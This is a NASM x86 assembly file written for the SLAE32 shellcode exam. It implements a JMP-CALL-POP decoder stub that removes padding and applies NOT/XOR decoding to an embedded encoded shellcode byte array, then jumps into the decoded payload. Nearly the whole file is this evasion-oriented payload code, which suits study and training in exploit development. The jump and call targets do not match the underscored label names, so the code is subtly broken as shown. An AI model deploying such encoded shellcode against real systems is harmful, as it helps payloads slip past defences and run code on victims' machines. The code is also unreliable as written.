; custom-decoder.nasm
; Author: Jack McBride (PA-6483)
; Website:  https://jacklgmcbride.co.uk
;
; Purpose: SLAE32 exam assignment
;
;
; Assignment 4: Custom Encoder

global _start			

section .text

_start:

	jmp short call_shellcode;		Jump to the call_shellcode label

_decoder:

	pop esi;				POP the location of our shellcode into ESI
	lea edi, [esi];				Load the ESI register into EDI so both are pointing to the shellcode
	xor ebx, ebx;				Clear EBX register
	xor eax, eax;				Clear EAX register

_decode:

	mov bl, byte[esi + eax];		Move byte of encoded shellcode into BL
	mov dl, bl;				Copy byte to DL
	xor dl, 0xbb;				Check if at end of shellcode
	jz EncodedShellcode;			If at the end, jump to the decoded shellcode
	test al, 1;				Check if at an odd byte (padding)
	jnz decode_loop_inc;			
	not bl;					Perform NOT decoding on BL
	xor bl, 0x7;				XOR BL with 0x7
	mov byte [edi], bl;			Move decoded BL byte into EDI
	inc edi;				Point EDI at next byte
	inc eax;				Increment EAX by one
	jmp short decode;			Decode next byte

_decode_loop_inc:

	add al, 1;				Increment AL by 1
	jmp short decode;			Decode next byte

_call_shellcode:

	call decoder;				Call the decoder label
	EncodedShellcode: db 0xc9,0x54,0x38,0x07,0xa8,0x19,0x90,0x40,0xd7,0x59,0xd7,0x08,0x8b,0x0b,0x90,0x13,0x90,0x54,0xd7,0x13,0x9a,0x13,0x91,0x5d,0x96,0x06,0x71,0x36,0x1b,0x0e,0xa8,0x4b,0x71,0x47,0x1a,0x4e,0xab,0x07,0x71,0x09,0x19,0x34,0x48,0x60,0xf3,0x51,0x35,0x40,0x78,0xbb
